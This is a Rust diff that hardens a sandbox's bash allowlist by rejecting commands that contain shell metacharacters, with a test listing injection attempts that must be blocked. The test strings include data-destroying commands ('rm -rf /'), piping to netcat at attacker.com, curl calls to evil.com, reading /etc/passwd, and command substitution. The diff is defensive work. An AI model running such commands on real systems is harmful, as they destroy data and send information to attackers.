@@ -114,13 +114,29 @@ impl SandboxMode {
     }
 }
 
+/// Shell metacharacters that enable command chaining, piping, or substitution.
+/// When the bash policy is an allowlist, commands containing any of these are
+/// rejected outright — otherwise `echo; rm -rf /` would pass an "echo" allowlist.
+const SHELL_METACHARACTERS: &[char] = &[
+    ';', '|', '&', '`', '$', '(', ')', '{', '}', '<', '>', '!', '\n',
+];
+
 impl BashPolicy {
     /// Check if a command is allowed by the policy.
+    ///
+    /// In `Allowlist` mode, this rejects commands containing shell
+    /// metacharacters (`;`, `|`, `&`, `` ` ``, `$()`, etc.) to prevent
+    /// chaining attacks like `echo; rm -rf /`.
     fn allows(&self, command: &str) -> bool {
         match self {
             Self::AllowAll => true,
             Self::DenyAll => false,
             Self::Allowlist(allowed) => {
+                // Reject commands with shell metacharacters that could bypass
+                // the allowlist via command chaining or substitution.
+                if command.contains(SHELL_METACHARACTERS) {
+                    return false;
+                }
                 let first_word = command.split_whitespace().next().unwrap_or("");
                 // Strip path prefixes for matching.
                 let binary = first_word.rsplit('/').next().unwrap_or(first_word);
@@ -387,6 +403,44 @@ mod tests {
     fn policy_allowlist_empty_command() {
         let policy = BashPolicy::Allowlist(vec!["ls".into()]);
         assert!(!policy.allows(""));
+    }
+
+    #[test]
+    fn policy_allowlist_rejects_shell_metacharacter_injection() {
+        let policy = BashPolicy::Allowlist(vec!["echo".into(), "ls".into(), "cat".into()]);
+
+        // Semicolon chaining.
+        assert!(!policy.allows("echo hello; rm -rf /"));
+        // Pipe.
+        assert!(!policy.allows("echo hello | nc attacker.com 1234"));
+        // Logical AND.
+        assert!(!policy.allows("cat /etc/passwd && curl https://evil.com"));
+        // Logical OR.
+        assert!(!policy.allows("ls /nonexistent || curl https://evil.com"));
+        // Command substitution (backticks).
+        assert!(!policy.allows("echo `whoami`"));
+        // Command substitution ($()).
+        assert!(!policy.allows("echo $(id)"));
+        // Process substitution.
+        assert!(!policy.allows("cat <(curl https://evil.com)"));
+        // Redirection.
+        assert!(!policy.allows("echo pwned > /tmp/exploit"));
+        // Background execution.
+        assert!(!policy.allows("echo hello & curl evil.com &"));
+        // Subshell.
+        assert!(!policy.allows("echo hello; (curl evil.com)"));
+        // Newline injection.
+        assert!(!policy.allows("echo hello\nrm -rf /"));
+        // Brace expansion with command.
+        assert!(!policy.allows("echo ${PATH}"));
+        // Negation operator.
+        assert!(!policy.allows("echo hello || ! rm -rf /"));
+
+        // But clean commands still work.
+        assert!(policy.allows("echo hello world"));
+        assert!(policy.allows("ls -la /tmp"));
+        assert!(policy.allows("cat /etc/hostname"));
+        assert!(policy.allows("echo 'safe with spaces'"));
     }
 
     #[test]
